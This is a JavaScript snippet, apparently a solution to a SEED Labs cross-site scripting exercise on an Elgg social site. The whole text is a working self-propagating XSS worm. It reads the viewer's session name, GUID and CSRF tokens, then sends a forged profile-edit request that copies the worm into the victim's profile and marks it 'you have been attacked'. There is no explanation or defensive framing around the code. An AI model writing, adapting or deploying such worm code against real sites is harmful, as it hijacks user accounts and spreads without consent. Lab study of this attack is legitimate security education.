<script type="text/javascript" id = "worm">
window.onload = function () {
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode =document.getElementById("worm").innerHTML;
	var tailTag = "</"+"script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);	
	//realize self-propagation
	 //JavaScript code to access user name,user guid, Time Stamp __elgg_ts
	// and Security Token __elgg_token
	var userName ="&name=" +elgg.session.user.name;
	var guid = "&guid=" + elgg.session.user.guid;
	var ts = "&__elgg_ts=" +elgg.security.token.__elgg_ts;
	var token = "__elgg_token=" + elgg.security.token.__elgg_token;
	//construct the content of your url.
	var content =token+ts+userName+"&description="+wormCode+ "&accesslevel[description]=2"+
	"&briefdescription=you%20have%20been%20attacked&accesslevel[briefdescription]=2"+guid;
	var myGuid = 56;
	var sendurl = 'http://www.seed-server.com/action/profile/edit';
	if (elgg.session.user.guid !=myGuid){
		//create and sent Ajax request to modify profile
		var Ajax = null;
		Ajax = new XMLHttpRequest();
		Ajax.open("POST", sendurl, true);
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send(content);
	}	
}
</script>
